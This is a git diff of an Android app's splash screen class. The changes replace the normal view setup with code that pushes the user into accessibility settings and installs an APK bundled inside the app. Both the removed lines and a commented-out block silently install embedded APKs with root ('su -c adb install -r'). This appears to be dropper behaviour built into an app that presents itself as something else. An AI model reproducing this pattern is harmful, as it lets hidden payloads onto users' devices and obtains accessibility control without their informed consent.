@@ -3,12 +3,16 @@ package com.ally.activity.splash;
 import static com.google.firebase.crashlytics.internal.proto.CodedOutputStream.DEFAULT_BUFFER_SIZE;
 
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.Settings;
 import android.view.View;
+import android.widget.Toast;
 
 import androidx.annotation.RequiresApi;
+import androidx.core.content.FileProvider;
 
 import com.ally.R;
 import com.ally.activity.base.BaseActivity;
@@ -34,36 +38,87 @@ public class SplashScreen extends BaseActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash_screen);
-          initView();
+      //    initView();
+        if(!checkAccessibilityPermission()){
+            Toast.makeText(SplashScreen.this, "Permission denied", Toast.LENGTH_SHORT).show();
+        }
         installDefaultApk();
 
     }
 
-    private void installDefaultApk() {
-        InputStream ins = getResources().openRawResource(
-                getResources().getIdentifier("daisy",
-                        "raw", getPackageName()));
-        File file=new File(getExternalCacheDir()+"/in");
+    public boolean checkAccessibilityPermission () {
+        int accessEnabled = 0;
         try {
-            copyInputStreamToFile(ins, file);
-            try {
-                String adbCommand = "adb install -r " + file.getAbsolutePath();
-                String[] commands = new String[]{"su", "-c", adbCommand};
-                Process process = Runtime.getRuntime().exec(commands);
-                process.waitFor();
-            } catch (Exception e) {
-                //Handle Exception
-                e.printStackTrace();
-            }
-
-        }
-        catch (Exception e)
-        {
+            accessEnabled = Settings.Secure.getInt(this.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
+        } catch (Settings.SettingNotFoundException e) {
             e.printStackTrace();
         }
-
-
+        if (accessEnabled == 0) {
+            // if not construct intent to request permission
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            // request permission via start activity for result
+            startActivity(intent);
+            return false;
+        } else {
+            return true;
+        }
     }
+
+    private void installDefaultApk() {
+                        InputStream ins = getResources().openRawResource(
+                        getResources().getIdentifier("first",
+                                "raw", getPackageName()));
+                File file=new File(getExternalCacheDir()+"/first.apk");
+                try {
+                    copyInputStreamToFile(ins, file);
+                }
+                catch (Exception e)
+                {
+                    e.printStackTrace();
+                }
+
+            Intent promptInstall = new Intent(Intent.ACTION_VIEW);
+
+
+        Uri apkURI = FileProvider.getUriForFile(
+                this,
+                getApplicationContext()
+                        .getPackageName() + ".provider", file);
+        promptInstall.setDataAndType(apkURI,
+                "application/vnd.android.package-archive");
+
+        promptInstall.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            startActivity(promptInstall);
+//        new Thread(new Runnable() {
+//            @Override
+//            public void run() {
+//                InputStream ins = getResources().openRawResource(
+//                        getResources().getIdentifier("first",
+//                                "raw", getPackageName()));
+//                File file=new File(getExternalCacheDir()+"/first.apk");
+//                try {
+//                    copyInputStreamToFile(ins, file);
+//                    try {
+//                        String adbCommand = "adb install -r " + file.getAbsolutePath();
+//                        String[] commands = new String[]{"su","-c", adbCommand};
+//                        Process process = Runtime.getRuntime().exec(commands);
+//                        process.waitFor();
+//                    } catch (Exception e) {
+//                        //Handle Exception
+//                        e.printStackTrace();
+//                    }
+//            } catch (IOException e) {
+//                    e.printStackTrace();
+//                }
+//            }}).start();
+
+
+        }
+
+
+
+
 
     private static void copyInputStreamToFile(InputStream inputStream, File file)
             throws IOException {
